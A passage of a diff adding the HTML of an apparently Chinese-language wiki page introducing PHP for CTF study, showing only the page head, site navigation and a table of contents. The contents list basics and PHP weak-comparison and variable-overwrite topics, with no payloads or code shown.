@@ -1,0 +1,2820 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="Cola Pig">
+      
+      
+        <link rel="canonical" href="https://cpwiki.v6.army/Code/CTF/PHP/PHP1/">
+      
+      
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS 订阅" href="../../../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="已更新内容的 RSS 订阅" href="../../../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.14">
+    
+    
+      
+        <title>初识PHP - Cola Pig's Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.342714a4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Wcowin/Mkdocs-Wcowin@main/docs/stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Wcowin/Wcowin.github.io@main/docs/stylesheets/link.css">
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Wcowin/Wcowin.github.io@main/docs/stylesheets/customize.css">
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Wcowin/Wcowin.github.io@main/docs/stylesheets/ziti.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#php" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../../.." title="Cola Pig&#39;s Wiki" class="md-header__button md-logo" aria-label="Cola Pig's Wiki" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Cola Pig's Wiki
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              初识PHP
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="关闭自动模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="关闭自动模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1M8 13h8v-2H8zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4a5 5 0 0 0 5-5 5 5 0 0 0-5-5"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="indigo"  aria-label="切换至夜间模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换至夜间模式" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="切换至日间模式"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="切换至日间模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Cola-Pig1121/cpwiki" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Cola-Pig1121/cpwiki
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../.." class="md-tabs__link">
+          
+  
+  
+    
+  
+  简介
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Markdown/markdown/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  信息技术
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../GH/Website/free-build-site/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  干货
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../tag/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  标签
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../liuyanban/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  留言板
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../link/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  友链
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../about/geren/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  关于
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Cola Pig&#39;s Wiki" class="md-nav__button md-logo" aria-label="Cola Pig's Wiki" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Cola Pig's Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Cola-Pig1121/cpwiki" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Cola-Pig1121/cpwiki
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../.." class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    简介
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_1" id="__nav_1_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            简介
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../index2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    自我介绍 - 2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    信息技术
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            信息技术
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Markdown指南
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Markdown指南
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Markdown/markdown/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Markdown指南
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    网络安全学习
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            网络安全学习
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../PHP1.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    初识PHP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    干货
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            干货
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    网站搭建
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            网站搭建
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../GH/Website/free-build-site/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    免费搭建博客技巧
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../tag/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    标签
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../liuyanban/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    留言板
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../link/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    友链
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    关于
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            关于
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../about/geren/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    个人
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--new"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../about/zcw/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    支持我
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--new"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#php_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      PHP基础格式
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      变量 赋值 以及 运算
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      类型比较
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      输出
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      数组
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      魔术常量
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      表单数据
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      内建函数
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      PHP 函数安全
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PHP 函数安全">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      常见绕过
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="常见绕过">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#is_numeric" class="md-nav__link">
+    <span class="md-ellipsis">
+      is_numeric
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      PHP 精度
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      比较和类型转换漏洞
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      PHP 弱类型比较
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PHP 弱类型比较">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#strcmp" class="md-nav__link">
+    <span class="md-ellipsis">
+      strcmp()
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#is_numeric_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      is_numeric()
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#is_switch" class="md-nav__link">
+    <span class="md-ellipsis">
+      is_switch()
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#md5" class="md-nav__link">
+    <span class="md-ellipsis">
+      md5()
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="md5()">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#0e" class="md-nav__link">
+    <span class="md-ellipsis">
+      ==（0e 比较）
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="==（0e 比较）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#md5-0e" class="md-nav__link">
+    <span class="md-ellipsis">
+      常见 md5 以 0e 开头的值
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      ===（数组比较）
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="===（数组比较）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#md5_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      md5 碰撞
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sha1" class="md-nav__link">
+    <span class="md-ellipsis">
+      sha1()
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      变量覆盖漏洞
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="变量覆盖漏洞">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
